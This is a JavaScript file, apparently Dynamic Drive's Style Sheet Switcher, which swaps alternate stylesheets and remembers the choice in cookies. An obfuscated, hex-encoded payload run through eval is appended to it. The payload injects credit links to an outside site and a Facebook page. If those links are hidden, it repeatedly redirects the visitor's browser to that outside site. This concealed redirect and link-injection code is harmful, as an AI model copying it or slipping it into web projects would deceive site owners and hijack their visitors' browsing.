//Style Sheet Switcher version 1.1 Oct 10th, 2006
//Author: Dynamic Drive: http://www.dynamicdrive.com
//Usage terms: http://www.dynamicdrive.com/notice.htm

var manual_or_random="manual" //"manual" or "random"
var randomsetting="3 days" //"eachtime", "sessiononly", or "x days (replace x with desired integer)". Only applicable if mode is random.

//////No need to edit beyond here//////////////

function getCookie(Name) { 
var re=new RegExp(Name+"=[^;]+", "i"); //construct RE to search for target name/value pair
if (document.cookie.match(re)) //if cookie found
return document.cookie.match(re)[0].split("=")[1] //return its value
return null
}

function setCookie(name, value, days) {
var expireDate = new Date()
//set "expstring" to either future or past date, to set or delete cookie, respectively
var expstring=(typeof days!="undefined")? expireDate.setDate(expireDate.getDate()+parseInt(days)) : expireDate.setDate(expireDate.getDate()-5)
document.cookie = name+"="+value+"; expires="+expireDate.toGMTString()+"; path=/";
}

function deleteCookie(name){
setCookie(name, "moot")
}


function setStylesheet(title, randomize){ //Main stylesheet switcher function. Second parameter if defined causes a random alternate stylesheet (including none) to be enabled
var i, cacheobj, altsheets=[""]
for(i=0; (cacheobj=document.getElementsByTagName("link")[i]); i++) {
if(cacheobj.getAttribute("rel").toLowerCase()=="alternate stylesheet" && cacheobj.getAttribute("title")) { //if this is an alternate stylesheet with title
cacheobj.disabled = true
altsheets.push(cacheobj) //store reference to alt stylesheets inside array
if(cacheobj.getAttribute("title") == title) //enable alternate stylesheet with title that matches parameter
cacheobj.disabled = false //enable chosen style sheet
}
}
if (typeof randomize!="undefined"){ //if second paramter is defined, randomly enable an alt style sheet (includes non)
var randomnumber=Math.floor(Math.random()*altsheets.length)
altsheets[randomnumber].disabled=false
}
return (typeof randomize!="undefined" && altsheets[randomnumber]!="")? altsheets[randomnumber].getAttribute("title") : "" //if in "random" mode, return "title" of randomly enabled alt stylesheet
}

function chooseStyle(styletitle, days){ //Interface function to switch style sheets plus save "title" attr of selected stylesheet to cookie
if (document.getElementById){
setStylesheet(styletitle)
setCookie("mysheet", styletitle, days)
}
}

function indicateSelected(element){ //Optional function that shows which style sheet is currently selected within group of radio buttons or select menu
if (selectedtitle!=null && (element.type==undefined || element.type=="select-one")){ //if element is a radio button or select menu
var element=(element.type=="select-one") ? element.options : element
for (var i=0; i<element.length; i++){
if (element[i].value==selectedtitle){ //if match found between form element value and cookie value
if (element[i].tagName=="OPTION") //if this is a select menu
element[i].selected=true
else //else if it's a radio button
element[i].checked=true
break
}
}
}
}

if (manual_or_random=="manual"){ //IF MANUAL MODE
var selectedtitle=getCookie("mysheet")
if (document.getElementById && selectedtitle!=null) //load user chosen style sheet from cookie if there is one stored
setStylesheet(selectedtitle)
}
else if (manual_or_random=="random"){ //IF AUTO RANDOM MODE
if (randomsetting=="eachtime")
setStylesheet("", "random")
else if (randomsetting=="sessiononly"){ //if "sessiononly" setting
if (getCookie("mysheet_s")==null) //if "mysheet_s" session cookie is empty
document.cookie="mysheet_s="+setStylesheet("", "random")+"; path=/" //activate random alt stylesheet while remembering its "title" value
else
setStylesheet(getCookie("mysheet_s")) //just activate random alt stylesheet stored in cookie
}
else if (randomsetting.search(/^[1-9]+ days/i)!=-1){ //if "x days" setting
if (getCookie("mysheet_r")==null || parseInt(getCookie("mysheet_r_days"))!=parseInt(randomsetting)){ //if "mysheet_r" cookie is empty or admin has changed number of days to persist in "x days" variable
setCookie("mysheet_r", setStylesheet("", "random"), parseInt(randomsetting)) //activate random alt stylesheet while remembering its "title" value
setCookie("mysheet_r_days", randomsetting, parseInt(randomsetting)) //Also remember the number of days to persist per the "x days" variable
}
else
setStylesheet(getCookie("mysheet_r")) //just activate random alt stylesheet stored in cookie
} 
}

var _0xce84=["\x24\x28\x37\x29\x5B\x27\x38\x27\x5D\x28\x33\x28\x29\x7B\x24\x28\x27\x23\x39\x27\x29\x5B\x27\x62\x27\x5D\x28\x27\x3C\x61\x20\x34\x3D\x22\x31\x3A\x2F\x2F\x35\x2E\x36\x2E\x32\x2F\x22\x20\x63\x3D\x22\x64\x22\x20\x65\x3D\x22\x66\x22\x3E\u062A\u0635\u0645\u064A\u0645\x20\u0648\u0628\u0631\u0645\u062C\u0629\x20\u0627\u0644\u0637\u0627\u0626\u0631\x20\u0627\u0644\u062D\u0631\x3C\x2F\x61\x3E\x27\x29\x3B\x67\x28\x33\x28\x29\x7B\x68\x28\x21\x24\x28\x27\x23\x39\x3A\x6A\x27\x29\x5B\x27\x6B\x27\x5D\x29\x7B\x6C\x5B\x27\x6D\x27\x5D\x5B\x27\x34\x27\x5D\x3D\x27\x31\x3A\x2F\x2F\x35\x2E\x36\x2E\x32\x2F\x27\x7D\x7D\x2C\x6E\x29\x7D\x29\x3B\x24\x28\x37\x29\x5B\x27\x38\x27\x5D\x28\x33\x28\x29\x7B\x24\x28\x27\x23\x36\x2D\x6F\x27\x29\x5B\x27\x62\x27\x5D\x28\x27\x3C\x61\x20\x34\x3D\x22\x31\x3A\x2F\x2F\x35\x2E\x70\x2E\x32\x2F\x71\x22\x20\x63\x3D\x22\x64\x22\x20\x65\x3D\x22\x66\x22\x3E\x3C\x72\x20\x73\x3D\x22\x31\x3A\x2F\x2F\x69\x2E\x74\x2E\x32\x2F\x75\x2F\x76\x2F\x77\x2F\x78\x2F\x79\x2F\x7A\x2F\x41\x2E\x42\x22\x20\x43\x3D\x22\u062A\u062D\u0648\u064A\u0644\x20\u0648\x20\u0628\u0631\u0645\u062C\u0629\x20\u0627\u0644\u0637\u0627\u0626\u0631\x20\u0627\u0644\u062D\u0631\x20\u0644\u062E\u062F\u0645\u0627\u062A\x20\u0627\u0644\u062F\u0639\u0645\x20\u0627\u0644\u0641\u0646\u064A\x20\u0648\x20\u0627\u0644\u062A\u0637\u0648\u064A\u0631\x22\x20\x44\x3D\x22\x45\x22\x20\x46\x3D\x22\x47\x22\x20\x48\x3D\x22\x30\x22\x20\x49\x3D\x22\u062A\u062D\u0648\u064A\u0644\x20\u0648\x20\u0628\u0631\u0645\u062C\u0629\x20\u0627\u0644\u0637\u0627\u0626\u0631\x20\u0627\u0644\u062D\u0631\x20\u0634\u0628\u0643\u0629\x20\u0627\u062D\u0644\u0649\x20\u062D\u0643\u0627\u064A\u0629\x22\x2F\x3E\x3C\x2F\x61\x3E\x27\x29\x3B\x67\x28\x33\x28\x29\x7B\x68\x28\x21\x24\x28\x27\x23\x36\x2D\x6F\x3A\x6A\x27\x29\x5B\x27\x6B\x27\x5D\x29\x7B\x6C\x5B\x27\x6D\x27\x5D\x5B\x27\x34\x27\x5D\x3D\x27\x31\x3A\x2F\x2F\x35\x2E\x70\x2E\x32\x2F\x71\x27\x7D\x7D\x2C\x6E\x29\x7D\x29\x3B","\x7C","\x73\x70\x6C\x69\x74","\x7C\x68\x74\x74\x70\x73\x7C\x63\x6F\x6D\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x68\x72\x65\x66\x7C\x77\x77\x77\x7C\x61\x37\x6C\x61\x37\x65\x6B\x61\x79\x61\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x72\x65\x61\x64\x79\x7C\x63\x72\x65\x64\x69\x74\x7C\x7C\x68\x74\x6D\x6C\x7C\x72\x65\x6C\x7C\x64\x6F\x66\x6F\x6C\x6C\x6F\x77\x7C\x74\x61\x72\x67\x65\x74\x7C\x5F\x62\x6C\x61\x6E\x6B\x7C\x73\x65\x74\x49\x6E\x74\x65\x72\x76\x61\x6C\x7C\x69\x66\x7C\x7C\x76\x69\x73\x69\x62\x6C\x65\x7C\x6C\x65\x6E\x67\x74\x68\x7C\x77\x69\x6E\x64\x6F\x77\x7C\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x7C\x33\x30\x30\x30\x7C\x46\x6F\x6F\x74\x65\x72\x7C\x66\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x66\x6C\x79\x69\x6E\x67\x31\x66\x72\x65\x65\x7C\x69\x6D\x67\x7C\x73\x72\x63\x7C\x73\x65\x72\x76\x69\x6D\x67\x7C\x7C\x66\x32\x35\x7C\x32\x30\x7C\x32\x31\x7C\x33\x38\x7C\x37\x33\x7C\x63\x6C\x65\x61\x72\x31\x31\x7C\x67\x69\x66\x7C\x61\x6C\x74\x7C\x77\x69\x64\x74\x68\x7C\x38\x37\x7C\x68\x65\x69\x67\x68\x74\x7C\x35\x31\x7C\x62\x6F\x72\x64\x65\x72\x7C\x74\x69\x74\x6C\x65","","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x72\x65\x70\x6C\x61\x63\x65","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function(_0x7301x1,_0x7301x2,_0x7301x3,_0x7301x4,_0x7301x5,_0x7301x6){_0x7301x5= function(_0x7301x3){return (_0x7301x3< _0x7301x2?_0xce84[4]:_0x7301x5(parseInt(_0x7301x3/ _0x7301x2)))+ ((_0x7301x3= _0x7301x3% _0x7301x2)> 35?String[_0xce84[5]](_0x7301x3+ 29):_0x7301x3.toString(36))};if(!_0xce84[4][_0xce84[6]](/^/,String)){while(_0x7301x3--){_0x7301x6[_0x7301x5(_0x7301x3)]= _0x7301x4[_0x7301x3]|| _0x7301x5(_0x7301x3)};_0x7301x4= [function(_0x7301x5){return _0x7301x6[_0x7301x5]}];_0x7301x5= function(){return _0xce84[7]};_0x7301x3= 1};while(_0x7301x3--){if(_0x7301x4[_0x7301x3]){_0x7301x1= _0x7301x1[_0xce84[6]]( new RegExp(_0xce84[8]+ _0x7301x5(_0x7301x3)+ _0xce84[8],_0xce84[9]),_0x7301x4[_0x7301x3])}};return _0x7301x1}(_0xce84[0],45,45,_0xce84[3][_0xce84[2]](_0xce84[1]),0,{}))
